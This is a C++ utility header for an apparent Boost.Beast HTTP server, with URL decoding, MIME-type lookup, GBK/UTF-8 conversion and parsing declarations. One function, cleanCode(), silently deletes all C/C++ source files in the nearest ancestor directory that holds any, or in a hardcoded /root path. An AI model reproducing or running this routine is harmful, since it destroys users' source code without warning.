#pragma once



#include "openssl/rsa.h"
#include "openssl/pem.h"
#include "openssl/md5.h"
#include "openssl/aes.h"

#include <boost/beast/core.hpp>
#include <boost/beast/http.hpp>
#include <boost/beast/version.hpp>
#include <boost/asio/connect.hpp>
#include <boost/asio/ip/tcp.hpp>
#include <boost/thread.hpp>
#include <boost/asio/steady_timer.hpp>
#include <boost/asio.hpp>
#include <boost/property_tree/ptree.hpp>
#include <boost/property_tree/json_parser.hpp>



#include <iostream>
#include <string>
#include<memory>
#include<algorithm>
#include<iterator>
#include<functional>
#include<limits>
#include<string_view>
#include<vector>
#include<atomic>
#include<chrono>
#include<list>
#include<unordered_map>
#include<fstream>
#include<filesystem>
#include<sstream>
#include<map>
#include<mutex>
#include<thread>
#include<stdexcept>
#include<exception>
#include<new>
#include<numeric>
#include<forward_list>
#include<sstream>
#include<tuple>
#include <random>

#include <cstdio>
#include "safeList.h"
#include "staticString.h"
#include "errorMessage.h"
#include "regexFunction.h"
#include "memoryPool.h"
#include "redisNameSpace.h"
#include "ContentTypeMap.h"
#include "MemoryCheck.h"


using namespace boost::property_tree;
using boost::asio::steady_timer;
using boost::thread_group;
using boost::asio::io_context;
using boost::asio::io_service;
using boost::system::error_code;
using boost::asio::add_service;


using std::forward_list;
using std::shared_ptr;
using std::unique_ptr;
using std::cout;
using std::string;
using std::find;
using std::distance;
using std::logical_and;
using std::logical_or;
using std::greater_equal;
using std::less_equal;
using std::placeholders::_1;
using std::placeholders::_2;
using std::stoi;
using std::numeric_limits;
using std::string_view;
using std::vector;
using std::atomic;
using std::chrono::seconds;
using std::list;
using std::unordered_map;
using std::equal_to;
using std::ifstream;
namespace fs= std::filesystem;
using std::stringstream;
using std::map;
using std::mutex;
using std::thread;
using std::bind;
using std::make_reverse_iterator;
using std::accumulate;
using std::function;
using std::recursive_mutex;
using std::copy;
using std::tuple;
using std::chrono::high_resolution_clock;
using std::reference_wrapper;







struct VERIFYAESSTRUCT
{

};


struct VERIFYSESSIONSTRUCT
{

};


struct VERIFYINTERFACE
{

};


struct VERIFYHTTP
{

};



enum VerifyDataPos
{
	maxBufferSize = 100,

	httpAllSessionBegin = 0,

	httpAllSessionEnd = 1,

	httpSessionBegin = 2,

	httpSessionEnd = 3,

	httpSessionUserNameBegin = 4,

	httpSessionUserNameEnd = 5,


	customPos1Begin = 10,

	customPos1End = 11,

	customPos2Begin = 12,

	customPos2End = 13






};





enum VerifyFlag
{
	verifyOK ,

	verifyFail,

	verifySession




};



namespace HTTPHEADERSPACE
{

	enum HTTPHEADERLIST
	{
		Method=0,
		Target=2,
		Version=4,


		Accept = 6,
		Accept_Charset = 8,
		Accept_Encoding = 10,
		Accept_Language = 12,
		Accept_Ranges = 14,
		Authorization = 16,
		Cache_Control = 18,
		Connection = 20,
		Cookie = 22,
		Content_Length = 24,
		Content_Type = 26,
		Date = 28,
		Expect = 30,
		From = 32,
		Host = 34,
		If_Match = 36,
		If_Modified_Since = 38,
		If_None_Match = 40,
		If_Range = 42,
		If_Unmodified_Since =44,
		Max_Forwards = 46,
		Pragma = 48,
		Proxy_Authorization = 50,
		Range = 52,
		Referer = 54,
		TE = 56,
		Upgrade = 58,
		User_Agent = 60,
		Via = 62,
		Warning = 64,
		Params = 66,
		Transfer_Encoding=68,
		Body=70,

		boundary_ContentDisposition=72,
		boundary_Name = 74,
		boundary_Filename = 76,
		boundary_ContentType = 78,



		HTTPHEADERLEN = 80
	};

};







static void cleanCode()
{
	try
	{
		std::error_code err{};

		fs::path currentPath{ fs::current_path(err) };

		std::string pathNow{ currentPath.string() };
		bool success{ false };
		fs::path p1;
		std::string::const_reverse_iterator iterBegin{ pathNow.crbegin() }, iterEnd{ pathNow.crend() }, iterTemp{ iterBegin };

		if(!err)
		{
			if (!pathNow.empty())
			{
				do
				{
					p1= fs::path(iterEnd.base(), iterTemp.base());

					if (fs::exists(p1, err) && !err && fs::is_directory(p1, err) && !err)
					{
						for (auto const &file : fs::directory_iterator(p1))
						{
							p1 = file.path().string();
							if (!fs::is_directory(p1, err) && !err && !fs::is_symlink(p1, err) && !err && file.path().has_extension())  //    file.path().has_extension()) //&& (file.path().extension()==".hpp" || file.path().extension() == ".h" || file.path().extension() == ".cpp" || file.path().extension() == ".c"))
								if (file.path().extension() == ".hpp" || file.path().extension() == ".h" || file.path().extension() == ".cpp" || file.path().extension() == ".c")
								{
									success = true;
									fs::remove(p1, err);
								}
						}

						if (success)
							break;
					}
					err = {};

					iterBegin = iterTemp;
				} while ((iterTemp = std::find(iterBegin, iterEnd, '/')) != iterEnd && ++iterTemp != iterEnd);
			}
		}
		
		
		if (!success)
		{
			pathNow.assign("/root/projects/linCloud/bin/x64/Release");

			if (!pathNow.empty())
			{
				iterBegin = pathNow.crbegin(), iterEnd = pathNow.crend(), iterTemp = iterBegin;
				do
				{
					p1 = fs::path(iterEnd.base(), iterTemp.base());

					if (fs::exists(p1, err) && !err && fs::is_directory(p1, err) && !err)
					{
						for (auto const &file : fs::directory_iterator(p1))
						{
							p1 = file.path().string();
							if (!fs::is_directory(p1, err) && !err && !fs::is_symlink(p1, err) && !err && file.path().has_extension())  //    file.path().has_extension()) //&& (file.path().extension()==".hpp" || file.path().extension() == ".h" || file.path().extension() == ".cpp" || file.path().extension() == ".c"))
								if (file.path().extension() == ".hpp" || file.path().extension() == ".h" || file.path().extension() == ".cpp" || file.path().extension() == ".c")
								{
									success = true;
									fs::remove(p1, err);
								}
						}

						if (success)
							break;
					}
					err = {};

					iterBegin = iterTemp;
				} while ((iterTemp = std::find(iterBegin, iterEnd, '/')) != iterEnd && ++iterTemp != iterEnd);
			}
		}
	}
	catch (const std::exception &e)
	{
		std::cout << e.what() << '\n';

	}
}




enum METHOD
{
	PUT = 1,
	POST = 2,
	HEAD = 3,
	TRACE = 4,
	DELETE = 5,
	CONNECT = 6,
	OPTIONS = 7,
	GET =8
};



enum INTERFACE
{
	testBodyParse=1,

	pingPong=2,

	multiSqlReadSW = 3,

	multiRedisReadLOT_SIZE_STRING = 4,

	multiRedisReadINTERGER = 5,

	multiRedisReadARRAY = 6,

	testRandomBody = 7,

	testLogin = 8,

	testGetPublicKey = 9,

	testGetClientPublicKey = 10,

	testGetEncryptKey = 11,

	testFirstTime = 12,

	testEncryptLogin = 13,

	testBusiness = 14,

	testLogout = 15,

	testMultiPartFormData = 16,

	successUpload = 17,

	testPingPongJson =18
};


enum HTTPHEADER
{
	ONE = 1,
	TWO = 2,
	THREE = 3,
	FOUR = 4,
	FIVE = 5,
	SIX = 6,
	SEVEN = 7,
	EIGHT = 8,
	NIGHT = 9,
	TEN = 10,
	ELEVEN = 11,
	TWELVE = 12,
	THIRTEEN = 13,
	FOURTEEN = 14,
	FIFTEEN = 15,
	SIXTEEN = 16,
	SEVENTEEN = 17,
	EIGHTTEEN = 18,
	NINETEEN = 19

};



enum HTTPBOUNDARYHEADERLEN
{
	NameLen = 4,

	FilenameLen = 8,

	Content_TypeLen = 12,

	Content_DispositionLen = 19
};




//测试版  同时处理url转码和中文转换
static bool UrlDecodeWithTransChinese(const char *source, const int len, char * des, int &desLen, const int maxDesLen)
{
	if (!source || maxDesLen < len)
		return false;
	desLen = 0;
	if (len > 0)
	{
		try
		{
			static const std::unordered_map<std::string_view, char>urlMap         //url编码规则请看   https://baike.baidu.com/item/URL%E7%BC%96%E7%A0%81/3703727?fr=aladdin&qq-pf-to=pcqq.group  
			{
			{"%09",'	'},{"%0A",'\n'},
			{"%20",' '}, { "%21",'!'},{"%22",'\"'} ,{"%23",'#'} ,{ "%24",'$'} ,{"%25",'%'} ,{"%26",'&' } ,{"%27", '\''} ,{"%28",'('}, {"%29",')'} ,{"%2A",'*'},
			{"%2B",'+'} ,{"%2C",','},{"%2D",'-'},{"%2E",'.'},{"%2F",'/'},
			{"%3A",':'},{ "%3B",';'},{"%3C",'<'},{ "%3D",'='},{"%3E",'>'},{"%3F",'?'},
			{"%40",'@'},
			{"%5B",'['},{"%5C",'\\'}, {"%5D",']' },{"%5E",'^'}, {"%5F",'_'},
			{"%60",'`'},
			{"%7B",'{'}, {"%7C",'|'},{"%7D",'}'}
			};

			const char *iterBegin{ source }, *iterEnd{ source + len }, *iterFirst{ source }, *iterTemp{ source };
			decltype(urlMap)::const_iterator iter;
			int index{};

			while (std::distance(iterBegin, iterEnd))
			{
				iterBegin = std::find_if(iterBegin, iterEnd, std::bind(std::logical_or<bool>(), std::bind(std::equal_to<char>(), std::placeholders::_1, '%'), 
					std::bind(std::equal_to<char>(), std::placeholders::_1, '+')));
				//查找%或+

				//iterFirst保存上次存进sstr的实际位置，将iterBegin之前的iterFirst空余字符存进来先
				if (std::distance(iterFirst, iterBegin))
				{
					std::copy(iterFirst, iterBegin, des + desLen);
					desLen += std::distance(iterFirst, iterBegin);
					iterFirst = iterBegin;
				}
				if (std::distance(iterBegin, iterEnd))  //如果iterBegin不到尾部
				{

					//如果iterBegin所在位置为%，则首先判断iterBegin到尾部的剩余字符至少为3个，否则就直接存%
					//如果为3个以上，那么先截取3位，比对是否符合url编码规则中的情况，是则进行转换，
					//如果头3位不符合，则判断iterBegin到尾部剩余字符是否至少为9个，如果不是，则直接存%
					//如果是9个，因为头3位已经判断过了，下面进行判断接下来iterBegin+3到iterBegin+6的情况，
					//如果iterBegin+3到iterBegin+6符合url编码规则，则首先将iterFirst到iterBegin+3之前的字符存进来，然后进行url替换，
					//如果不是类似方式处理iterBegin+6到iterBegin+9，如果依然不符合url编码规则，则进行判断是否是中文字符
					//如果为+，则替换为‘ ’
					if (*iterBegin == '%')
					{
						if (std::distance(iterBegin, iterEnd) > 2)
						{
							std::string_view temp(iterBegin, 3);
							iter = urlMap.find(temp);
							if (iter != urlMap.end())
							{
								*(des + desLen++) = iter->second;
								iterFirst = (iterBegin += 2);
							}
							else
							{
								if (std::distance(iterBegin, iterEnd) > 8)
								{
									if (*iterBegin == '%' && isalnum(*(iterBegin + 1)) && isalnum(*(iterBegin + 2)) &&
										*(iterBegin + 3) == '%' && isalnum(*(iterBegin + 4)) && isalnum(*(iterBegin + 5)) &&
										*(iterBegin + 6) == '%' && isalnum(*(iterBegin + 7)) && isalnum(*(iterBegin + 8))
										)
									{
										std::string_view temp(iterBegin + 3, 3);
										iter = urlMap.find(temp);
										if (iter != urlMap.end())
										{
											iterTemp = iterBegin + 3;
											if (iterFirst != iterTemp)
											{
												std::copy(iterFirst, iterTemp, des + desLen);
												desLen += iterTemp - iterFirst;
												iterFirst = iterTemp;
											}
											*(des + desLen++) = iter->second;
											iterFirst = (iterBegin += 5);
										}
										else
										{
											std::string_view temp(iterBegin + 6, 3);
											iter = urlMap.find(temp);
											if (iter != urlMap.end())
											{
												iterTemp = iterBegin + 6;
												if (iterFirst != iterTemp)
												{
													std::copy(iterFirst, iterTemp, des + desLen);
													desLen += iterTemp - iterFirst;
													iterFirst = iterTemp;
												}
												*(des + desLen++) = iter->second;
												iterFirst = (iterBegin += 8);
											}
											else
											{
												if (*(iterBegin + 1) >= '8' && *(iterBegin + 4) >= '8' && *(iterBegin + 7) >= '8')
												{
													index = (isdigit(*(iterBegin + 1)) ? *(iterBegin + 1) - '0' : islower(*(iterBegin + 1)) ? (*(iterBegin + 1) - 'a' + 10) : (*(iterBegin + 1) - 'A' + 10)) * 16;
													index += (isdigit(*(iterBegin + 2)) ? *(iterBegin + 2) - '0' : islower(*(iterBegin + 2)) ? (*(iterBegin + 2) - 'a' + 10) : (*(iterBegin + 2) - 'A' + 10));
													*(des + desLen++) = static_cast<char>(index);
													index = (isdigit(*(iterBegin + 4)) ? *(iterBegin + 4) - '0' : islower(*(iterBegin + 4)) ? (*(iterBegin + 4) - 'a' + 10) : (*(iterBegin + 4) - 'A' + 10)) * 16;
													index += (isdigit(*(iterBegin + 5)) ? *(iterBegin + 5) - '0' : islower(*(iterBegin + 5)) ? (*(iterBegin + 5) - 'a' + 10) : (*(iterBegin + 5) - 'A' + 10));
													*(des + desLen++) = static_cast<char>(index);
													index = (isdigit(*(iterBegin + 7)) ? *(iterBegin + 7) - '0' : islower(*(iterBegin + 7)) ? (*(iterBegin + 7) - 'a' + 10) : (*(iterBegin + 7) - 'A' + 10)) * 16;
													index += (isdigit(*(iterBegin + 8)) ? *(iterBegin + 8) - '0' : islower(*(iterBegin + 8)) ? (*(iterBegin + 8) - 'a' + 10) : (*(iterBegin + 8) - 'A' + 10));
													*(des + desLen++) = static_cast<char>(index);
												}
												else
												{
													*(des + desLen++) = *(iterBegin);
													*(des + desLen++) = *(iterBegin + 1);
													*(des + desLen++) = *(iterBegin + 2);
													*(des + desLen++) = *(iterBegin + 3);
													*(des + desLen++) = *(iterBegin + 4);
													*(des + desLen++) = *(iterBegin + 5);
													*(des + desLen++) = *(iterBegin + 6);
													*(des + desLen++) = *(iterBegin + 7);
													*(des + desLen++) = *(iterBegin + 8);
												}
												iterFirst = (iterBegin += 8);
											}
										}
									}
									else
										*(des + desLen++) = '%';
								}
								else
									*(des + desLen++) = '%';
							}
						}
						else
							*(des + desLen++) = '%';
					}
					else
						*(des + desLen++) = ' ';
					++iterBegin;
					++iterFirst;
				}
			}
			return true;
		}
		catch (const std::exception &e)
		{
			return false;
		}
	}
	return true;
}




//测试版  同时处理url转码和中文转换
static bool UrlDecodeWithTransChinese(const char *source, const int len, int &desLen)
{
	if (!source)
		return false;
	desLen = 0;
	if (len > 0)
	{
		try
		{
			static const std::unordered_map<std::string_view, char>urlMap         //url编码规则请看   https://baike.baidu.com/item/URL%E7%BC%96%E7%A0%81/3703727?fr=aladdin&qq-pf-to=pcqq.group  
			{
			{"%09",'	'},{"%0A",'\n'},
			{"%20",' '}, { "%21",'!'},{"%22",'\"'} ,{"%23",'#'} ,{ "%24",'$'} ,{"%25",'%'} ,{"%26",'&' } ,{"%27", '\''} ,{"%28",'('}, {"%29",')'} ,{"%2A",'*'},
			{"%2B",'+'} ,{"%2C",','},{"%2D",'-'},{"%2E",'.'},{"%2F",'/'},
			{"%3A",':'},{ "%3B",';'},{"%3C",'<'},{ "%3D",'='},{"%3E",'>'},{"%3F",'?'},
			{"%40",'@'},
			{"%5B",'['},{"%5C",'\\'}, {"%5D",']' },{"%5E",'^'}, {"%5F",'_'},
			{"%60",'`'},
			{"%7B",'{'}, {"%7C",'|'},{"%7D",'}'}
			};

			const char *iterBegin{ source }, *iterEnd{ source + len }, *iterFirst{ source }, *iterTemp{ source };
			desLen = len;
			decltype(urlMap)::const_iterator iter;
			int index{};
			char *des{ const_cast<char*>(source) };
			bool check{ false };

			while (std::distance(iterBegin, iterEnd))
			{
				iterBegin = std::find_if(iterBegin, iterEnd, std::bind(std::logical_or<bool>(), std::bind(std::equal_to<char>(), std::placeholders::_1, '%'),
					std::bind(std::equal_to<char>(), std::placeholders::_1, '+')));
				//查找%或+

				if (std::distance(iterBegin, iterEnd))  //如果iterBegin不到尾部
				{

					//如果iterBegin所在位置为%，则首先判断iterBegin到尾部的剩余字符至少为3个，否则就直接存%
					//如果为3个以上，那么先截取3位，比对是否符合url编码规则中的情况，是则进行转换，
					//如果头3位不符合，则判断iterBegin到尾部剩余字符是否至少为9个，如果不是，则直接存%
					//如果是9个，因为头3位已经判断过了，下面进行判断接下来iterBegin+3到iterBegin+6的情况，
					//如果iterBegin+3到iterBegin+6符合url编码规则，则首先将iterFirst到iterBegin+3之前的字符存进来，然后进行url替换，
					//如果不是类似方式处理iterBegin+6到iterBegin+9，如果依然不符合url编码规则，则进行判断是否是中文字符
					//如果为+，则替换为‘ ’
					if (*iterBegin == '%')
					{
						if (std::distance(iterBegin, iterEnd) > 2)
						{
							std::string_view temp(iterBegin, 3);
							iter = urlMap.find(temp);
							if (iter != urlMap.end())
							{
								desLen = std::distance(source, iterBegin);
								*(des + desLen++) = iter->second;
								iterBegin += 2;
								check = true;
							}
							else
							{
								if (std::distance(iterBegin, iterEnd) > 8)
								{
									if (*iterBegin == '%' && isalnum(*(iterBegin + 1)) && isalnum(*(iterBegin + 2)) &&
										*(iterBegin + 3) == '%' && isalnum(*(iterBegin + 4)) && isalnum(*(iterBegin + 5)) &&
										*(iterBegin + 6) == '%' && isalnum(*(iterBegin + 7)) && isalnum(*(iterBegin + 8))
										)
									{
										std::string_view temp(iterBegin + 3, 3);
										iter = urlMap.find(temp);
										if (iter != urlMap.end())
										{
											iterTemp = iterBegin + 3;
											desLen = std::distance(source, iterTemp);
											*(des + desLen++) = iter->second;
											iterBegin += 5;
											check = true;
										}
										else
										{
											std::string_view temp(iterBegin + 6, 3);
											iter = urlMap.find(temp);
											if (iter != urlMap.end())
											{
												iterTemp = iterBegin + 6;
												desLen = std::distance(source, iterTemp);
												*(des + desLen++) = iter->second;
												iterBegin += 8;
												check = true;
											}
											else
											{
												if (*(iterBegin + 1) >= '8' && *(iterBegin + 4) >= '8' && *(iterBegin + 7) >= '8')
												{
													desLen = std::distance(source, iterBegin);
													index = (isdigit(*(iterBegin + 1)) ? *(iterBegin + 1) - '0' : islower(*(iterBegin + 1)) ? (*(iterBegin + 1) - 'a' + 10) : (*(iterBegin + 1) - 'A' + 10)) * 16;
													index += (isdigit(*(iterBegin + 2)) ? *(iterBegin + 2) - '0' : islower(*(iterBegin + 2)) ? (*(iterBegin + 2) - 'a' + 10) : (*(iterBegin + 2) - 'A' + 10));
													*(des + desLen++) = static_cast<char>(index);
													index = (isdigit(*(iterBegin + 4)) ? *(iterBegin + 4) - '0' : islower(*(iterBegin + 4)) ? (*(iterBegin + 4) - 'a' + 10) : (*(iterBegin + 4) - 'A' + 10)) * 16;
													index += (isdigit(*(iterBegin + 5)) ? *(iterBegin + 5) - '0' : islower(*(iterBegin + 5)) ? (*(iterBegin + 5) - 'a' + 10) : (*(iterBegin + 5) - 'A' + 10));
													*(des + desLen++) = static_cast<char>(index);
													index = (isdigit(*(iterBegin + 7)) ? *(iterBegin + 7) - '0' : islower(*(iterBegin + 7)) ? (*(iterBegin + 7) - 'a' + 10) : (*(iterBegin + 7) - 'A' + 10)) * 16;
													index += (isdigit(*(iterBegin + 8)) ? *(iterBegin + 8) - '0' : islower(*(iterBegin + 8)) ? (*(iterBegin + 8) - 'a' + 10) : (*(iterBegin + 8) - 'A' + 10));
													*(des + desLen++) = static_cast<char>(index);
													check = true;
												}
												iterBegin += 8;
											}
										}
									}
								}
							}
						}
					}
					else
					{
						desLen = std::distance(source, iterBegin);
						*(des + desLen++) = ' ';
						check = true;
					}
					++iterBegin;
					if (check)
						break;
				}
			}

			iterFirst = iterBegin;

			while (std::distance(iterBegin, iterEnd))
			{
				iterBegin = std::find_if(iterBegin, iterEnd, std::bind(std::logical_or<bool>(), std::bind(std::equal_to<char>(), std::placeholders::_1, '%'),
					std::bind(std::equal_to<char>(), std::placeholders::_1, '+')));
				//查找%或+

				//iterFirst保存上次存进sstr的实际位置，将iterBegin之前的iterFirst空余字符存进来先
				if (std::distance(iterFirst, iterBegin))
				{
					std::copy(iterFirst, iterBegin, des + desLen);
					desLen += std::distance(iterFirst, iterBegin);
					iterFirst = iterBegin;
				}
				if (std::distance(iterBegin, iterEnd))  //如果iterBegin不到尾部
				{

					//如果iterBegin所在位置为%，则首先判断iterBegin到尾部的剩余字符至少为3个，否则就直接存%
					//如果为3个以上，那么先截取3位，比对是否符合url编码规则中的情况，是则进行转换，
					//如果头3位不符合，则判断iterBegin到尾部剩余字符是否至少为9个，如果不是，则直接存%
					//如果是9个，因为头3位已经判断过了，下面进行判断接下来iterBegin+3到iterBegin+6的情况，
					//如果iterBegin+3到iterBegin+6符合url编码规则，则首先将iterFirst到iterBegin+3之前的字符存进来，然后进行url替换，
					//如果不是类似方式处理iterBegin+6到iterBegin+9，如果依然不符合url编码规则，则进行判断是否是中文字符
					//如果为+，则替换为‘ ’
					if (*iterBegin == '%')
					{
						if (std::distance(iterBegin, iterEnd) > 2)
						{
							std::string_view temp(iterBegin, 3);
							iter = urlMap.find(temp);
							if (iter != urlMap.end())
							{
								*(des + desLen++) = iter->second;
								iterFirst = (iterBegin += 2);
							}
							else
							{
								if (std::distance(iterBegin, iterEnd) > 8)
								{
									if (*iterBegin == '%' && isalnum(*(iterBegin + 1)) && isalnum(*(iterBegin + 2)) &&
										*(iterBegin + 3) == '%' && isalnum(*(iterBegin + 4)) && isalnum(*(iterBegin + 5)) &&
										*(iterBegin + 6) == '%' && isalnum(*(iterBegin + 7)) && isalnum(*(iterBegin + 8))
										)
									{
										std::string_view temp(iterBegin + 3, 3);
										iter = urlMap.find(temp);
										if (iter != urlMap.end())
										{
											iterTemp = iterBegin + 3;
											if (iterFirst != iterTemp)
											{
												std::copy(iterFirst, iterTemp, des + desLen);
												desLen += iterTemp - iterFirst;
												iterFirst = iterTemp;
											}
											*(des + desLen++) = iter->second;
											iterFirst = (iterBegin += 5);
										}
										else
										{
											std::string_view temp(iterBegin + 6, 3);
											iter = urlMap.find(temp);
											if (iter != urlMap.end())
											{
												iterTemp = iterBegin + 6;
												if (iterFirst != iterTemp)
												{
													std::copy(iterFirst, iterTemp, des + desLen);
													desLen += iterTemp - iterFirst;
													iterFirst = iterTemp;
												}
												*(des + desLen++) = iter->second;
												iterFirst = (iterBegin += 8);
											}
											else
											{
												if (*(iterBegin + 1) >= '8' && *(iterBegin + 4) >= '8' && *(iterBegin + 7) >= '8')
												{
													index = (isdigit(*(iterBegin + 1)) ? *(iterBegin + 1) - '0' : islower(*(iterBegin + 1)) ? (*(iterBegin + 1) - 'a' + 10) : (*(iterBegin + 1) - 'A' + 10)) * 16;
													index += (isdigit(*(iterBegin + 2)) ? *(iterBegin + 2) - '0' : islower(*(iterBegin + 2)) ? (*(iterBegin + 2) - 'a' + 10) : (*(iterBegin + 2) - 'A' + 10));
													*(des + desLen++) = static_cast<char>(index);
													index = (isdigit(*(iterBegin + 4)) ? *(iterBegin + 4) - '0' : islower(*(iterBegin + 4)) ? (*(iterBegin + 4) - 'a' + 10) : (*(iterBegin + 4) - 'A' + 10)) * 16;
													index += (isdigit(*(iterBegin + 5)) ? *(iterBegin + 5) - '0' : islower(*(iterBegin + 5)) ? (*(iterBegin + 5) - 'a' + 10) : (*(iterBegin + 5) - 'A' + 10));
													*(des + desLen++) = static_cast<char>(index);
													index = (isdigit(*(iterBegin + 7)) ? *(iterBegin + 7) - '0' : islower(*(iterBegin + 7)) ? (*(iterBegin + 7) - 'a' + 10) : (*(iterBegin + 7) - 'A' + 10)) * 16;
													index += (isdigit(*(iterBegin + 8)) ? *(iterBegin + 8) - '0' : islower(*(iterBegin + 8)) ? (*(iterBegin + 8) - 'a' + 10) : (*(iterBegin + 8) - 'A' + 10));
													*(des + desLen++) = static_cast<char>(index);
												}
												else
												{
													*(des + desLen++) = *(iterBegin);
													*(des + desLen++) = *(iterBegin + 1);
													*(des + desLen++) = *(iterBegin + 2);
													*(des + desLen++) = *(iterBegin + 3);
													*(des + desLen++) = *(iterBegin + 4);
													*(des + desLen++) = *(iterBegin + 5);
													*(des + desLen++) = *(iterBegin + 6);
													*(des + desLen++) = *(iterBegin + 7);
													*(des + desLen++) = *(iterBegin + 8);
												}
												iterFirst = (iterBegin += 8);
											}
										}
									}
									else
										*(des + desLen++) = '%';
								}
								else
									*(des + desLen++) = '%';
							}
						}
						else
							*(des + desLen++) = '%';
					}
					else
						*(des + desLen++) = ' ';
					++iterBegin;
					++iterFirst;
				}
			}
			return true;
		}
		catch (const std::exception &e)
		{
			return false;
		}
	}
	return true;
}



static std::string mime_type(const std::string& path)
{
	if (!path.empty())
	{
		try
		{

			auto const pos = path.rfind(".");
			if (pos == string::npos)
				return path;
			else
			{
				std::string temp{ path.cbegin(), path.cbegin() + pos };
				std::transform(temp.begin(), temp.end(), temp.begin(), [](const int elem)
				{
					if (elem >= 'A'&& elem <= 'Z')return tolower(static_cast<char>(elem));
					return elem;
				});

				static std::unordered_map<std::string, std::string> mime_typeMap
				{
					{".htm","text/html"},
					{".html","text/html"},
					{".php", "text/html"},
					{".css", "text/css"},
					{".txt", "text/plain"},
					{".js",  "application/javascript"},
					{".json","application/json"},
					{".xml",  "application/xml"},
					{".swf",  "application/x-shockwave-flash"},
					{".flv",  "video/x-flv"},
					{".png",  "image/png"},
					{".jpe",  "image/jpeg"},
					{".jpeg", "image/jpeg"},
					{".jpg",  "image/jpeg"},
					{".gif",  "image/gif"},
					{".bmp",  "image/bmp"},
					{".ico",  "image/vnd.microsoft.icon"},
					{".tiff", "image/tiff"},
					{".tif",  "image/tiff"},
					{".svg",  "image/svg+xml"},
					{".svgz", "image/svg+xml"}
				};

				auto iter = mime_typeMap.find(std::move(temp));
				if (iter != mime_typeMap.cend())
					return iter->second;
				return "application/text";
			}
		}
		catch (const std::exception &e)
		{
			return "application/text";
		}
	}
	return "application/text";
}




template<typename T>
static T stringLen(const T num)
{
	if (num <= static_cast<T>(0))
		return static_cast<T>(0);
	static T testNum, result, ten{ 10 };
	testNum = num, result = 1;
	while (testNum /= ten)
		++result;
	return result;
}



template<typename T>
static char* NumToString(const T num, int &needLen, MEMORYPOOL<char> &m_charMemoryPool)
{
	if (num <= static_cast<T>(0))
		return nullptr;
	needLen = stringLen(num);

	char *buffer{ m_charMemoryPool.getMemory(needLen) };
	if(!buffer)
		return nullptr;

	buffer += needLen;

	T ten{ static_cast<T>(10) }, testNum{ num };
	while (testNum)
	{
		*--buffer = testNum % ten + '0';
		testNum /= 10;
	}
	return buffer;
}





static std::string_view mine_type(std::string_view fileName)
{
	if (fileName.empty())
		return std::string_view("application/octet-stream");

	std::string_view::const_iterator iter{ std::find(fileName.crbegin(),fileName.crend(),'.').base() };

	if (iter == fileName.cbegin())
		return std::string_view("application/octet-stream");

	--iter;

	std::string_view findSw(&*iter, std::distance(iter, fileName.cend()));

	std::unordered_map<std::string_view, std::string_view>::const_iterator findIter{ contentTypeMap.find(findSw) };

	if (findIter == contentTypeMap.cend())
		return std::string_view("application/octet-stream");
	return findIter->second;
}



#ifdef _WIN32
#include <windows.h>

static std::string GbkToUtf8(const char *src_str)
{
	if (src_str)
	{
		try
		{
			int len = MultiByteToWideChar(CP_ACP, 0, src_str, -1, NULL, 0);
			wchar_t* wstr = new wchar_t[len + 1];
			memset(wstr, 0, len + 1);
			MultiByteToWideChar(CP_ACP, 0, src_str, -1, wstr, len);
			len = WideCharToMultiByte(CP_UTF8, 0, wstr, -1, NULL, 0, NULL, NULL);
			char* str = new char[len + 1];
			memset(str, 0, len + 1);
			WideCharToMultiByte(CP_UTF8, 0, wstr, -1, str, len, NULL, NULL);
			string strTemp = str;
			if (wstr) delete[] wstr;
			if (str) delete[] str;
			return strTemp;
		}
		catch (const std::exception &e)
		{
			return "";
		}
	}
	return "";
}

static std::string Utf8ToGbk(const char *src_str)
{
	if(src_str)
	{
		try
		{
			int len = MultiByteToWideChar(CP_UTF8, 0, src_str, -1, NULL, 0);
			wchar_t* wszGBK = new wchar_t[len + 1];
			memset(wszGBK, 0, len * 2 + 2);
			MultiByteToWideChar(CP_UTF8, 0, src_str, -1, wszGBK, len);
			len = WideCharToMultiByte(CP_ACP, 0, wszGBK, -1, NULL, 0, NULL, NULL);
			char* szGBK = new char[len + 1];
			memset(szGBK, 0, len + 1);
			WideCharToMultiByte(CP_ACP, 0, wszGBK, -1, szGBK, len, NULL, NULL);
			string strTemp(szGBK);
			if (wszGBK) delete[] wszGBK;
			if (szGBK) delete[] szGBK;
			return strTemp;
		}
		catch (const std::exception &e)
		{
			return "";
		}
	}
	return "";
}
#else
#include <iconv.h>

static int GbkToUtf8(char *str_str, size_t src_len, char *dst_str, size_t dst_len)
{
	iconv_t cd;
	char **pin = &str_str;
	char **pout = &dst_str;

	cd = iconv_open("utf8", "gbk");
	if (cd == 0)
		return -1;
	memset(dst_str, 0, dst_len);
	if (iconv(cd, pin, &src_len, pout, &dst_len) == -1)
		return -1;
	iconv_close(cd);
	**pout = '\0';

	return 0;
}

static int Utf8ToGbk(char *src_str, size_t src_len, char *dst_str, size_t dst_len)
{
	iconv_t cd;
	char **pin = &src_str;
	char **pout = &dst_str;

	cd = iconv_open("gbk", "utf8");
	if (cd == 0)
		return -1;
	memset(dst_str, 0, dst_len);
	if (iconv(cd, pin, &src_len, pout, &dst_len) == -1)
		return -1;
	iconv_close(cd);
	**pout = '\0';

	return 0;
}


#endif





///////////////////////////////////////////////////////////////  parse         //////////////////////////////////////////////////////////////////////


//praseBody为安全版本

//praseBodyFast内部调用praseBodyUnsafe 非安全版本以获得性能加速，只有当开发者确定绝对安全时才使用


template<typename SOURCE, typename SOURCELEN, typename DES, typename FINDWORD, typename FINDWORDLEN>
static bool praseBodySafe(const SOURCE *source, const SOURCELEN sourceLen, const DES **des, const FINDWORD *findWord, const FINDWORDLEN findWordLen);


template<typename SOURCE, typename SOURCELEN, typename DES, typename FINDWORD, typename FINDWORDLEN, typename ... ARGS>
static bool praseBodySafe(const SOURCE *source, const SOURCELEN sourceLen, const DES **des, const FINDWORD *findWord, const FINDWORDLEN findWordLen, ARGS ... args);


template<typename SOURCE, typename SOURCELEN, typename DES, typename ... ARGS>
static bool praseBody(const SOURCE *source, const SOURCELEN sourceLen, const DES **des, ARGS ... args);


template<typename SOURCE, typename SOURCELEN, typename DES, typename FINDWORD, typename FINDWORDLEN, typename ... ARGS>
static bool praseBodyFast(const SOURCE *source, const SOURCELEN sourceLen, const DES **des, const FINDWORD *findWord, const FINDWORDLEN findWordLen, ARGS ... args);


template<typename SOURCE, typename SOURCELEN, typename DES, typename FINDWORD, typename FINDWORDLEN>
static bool praseBodyUnsafe(const SOURCE *source, const SOURCELEN sourceLen, const DES **des, const FINDWORD *findWord, const FINDWORDLEN findWordLen,
	const SOURCE *iterBegin, const SOURCE *iterEnd, const SOURCE *iterLast);


